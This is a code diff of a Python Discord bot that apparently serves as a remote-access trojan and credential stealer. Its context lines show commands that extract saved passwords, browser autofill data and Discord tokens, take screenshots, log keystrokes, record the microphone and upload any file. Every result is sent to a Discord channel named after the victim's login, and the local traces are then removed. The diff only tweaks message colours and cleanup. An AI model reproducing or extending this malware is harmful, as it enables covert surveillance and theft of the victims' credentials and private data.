@@ -493,7 +493,7 @@ class Client(discord.Client):
 
                 try:
                     KillProcess(command[1])
-                    embed = discord.Embed(description=f":white_check_mark: Process `{command[1]}` terminated !", color=discord.Color.purple())
+                    embed = discord.Embed(description=f":white_check_mark: Process `{command[1]}` terminated !", color=discord.Color.green())
                     await message.channel.send(embed=embed)
                 except:
                     embed = discord.Embed(description=f":no_entry: Cannot terminate process `{command[1]}`", color=discord.Color.red())
@@ -513,7 +513,7 @@ class Client(discord.Client):
                 await message.delete()
                 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                await message.channel.send(embed=embed)
+                embedSent = await message.channel.send(embed=embed)
 
                 ExtractAutofill()
 
@@ -525,6 +525,8 @@ class Client(discord.Client):
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Auto-fill.txt")
                 await message.channel.send(file=fileEmbed)
 
+                await embedSent.delete()
+
                 SafeRemove(filePath)
 
             # ____________________________________________________________________________________________________________________________________________________ #
@@ -533,7 +535,7 @@ class Client(discord.Client):
                 await message.delete()
                 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                await message.channel.send(embed=embed)
+                embedSent = await message.channel.send(embed=embed)
 
                 GetDiscordTokens()
                 tokens = ExtractInfosFromToken()
@@ -546,6 +548,8 @@ class Client(discord.Client):
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Discord Tokens.txt")
                 await message.channel.send(file=fileEmbed)
 
+                await embedSent.delete()
+
                 SafeRemove(filePath)
 
             # _____________________________________________________________________________________________________________________________________________________ #
@@ -554,7 +558,7 @@ class Client(discord.Client):
                 await message.delete()
                 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                await message.channel.send(embed=embed)
+                embedSent = await message.channel.send(embed=embed)
 
                 ExtractPasswords()
                 formatted = ""
@@ -572,6 +576,8 @@ class Client(discord.Client):
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Passwords.txt")
                 await message.channel.send(file=fileEmbed)
 
+                await embedSent.delete()
+
                 SafeRemove(filePath)
 
             # _______________________________________________________________________________________________________________________________________________ #
@@ -580,7 +586,7 @@ class Client(discord.Client):
                 await message.delete()
                 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                await message.channel.send(embed=embed)
+                embedSent = await message.channel.send(embed=embed)
 
                 requInfos = requests.get('https://ipinfo.io')
                 data = requInfos.json()
@@ -617,6 +623,8 @@ Internet Provider: {org}
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - PC Infos.txt")
                 await message.channel.send(file=fileEmbed)
 
+                await embedSent.delete()
+
                 SafeRemove(filePath)
 
             # __________________________________________________________________________________________________________________________________________________ #
@@ -625,7 +633,7 @@ Internet Provider: {org}
                 await message.delete()
 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                await message.channel.send(embed=embed)
+                embedSent = await message.channel.send(embed=embed)
                 
                 filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.png"
                 screenshot = pyautogui.screenshot()
@@ -633,6 +641,8 @@ Internet Provider: {org}
 
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Screenshot.png")
                 await message.channel.send(file=fileEmbed)
+
+                await embedSent.delete()
 
                 SafeRemove(filePath)
 
@@ -663,7 +673,7 @@ Internet Provider: {org}
                 keyloggerStatut = False
 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                await message.channel.send(embed=embed)
+                embedSent = await message.channel.send(embed=embed)
                 
                 filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                 finalMessage = ""
@@ -674,6 +684,8 @@ Internet Provider: {org}
 
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Keylogger Logs.txt")
                 await message.channel.send(file=fileEmbed)
+
+                await embedSent.delete()
 
                 SafeRemove(filePath)
 
@@ -727,10 +739,12 @@ Internet Provider: {org}
                 RecordMicro(filePath=filePath)
 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                await message.channel.send(embed=embed)
+                embedSent = await message.channel.send(embed=embed)
 
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Recorded.wav")
                 await message.channel.send(file=fileEmbed)
+
+                await embedSent.delete()
 
                 SafeRemove(filePath)
 
@@ -746,11 +760,13 @@ Internet Provider: {org}
                     return
 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                await message.channel.send(embed=embed)
+                embedSent = await message.channel.send(embed=embed)
 
                 filePath = command[1]
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - {os.path.basename(filePath)}")
                 await message.channel.send(file=fileEmbed)
+
+                await embedSent.delete()
 
             # ____________________________________________________________________________________________________________________________________________ #
             # =================================================================== .idle ================================================================== #
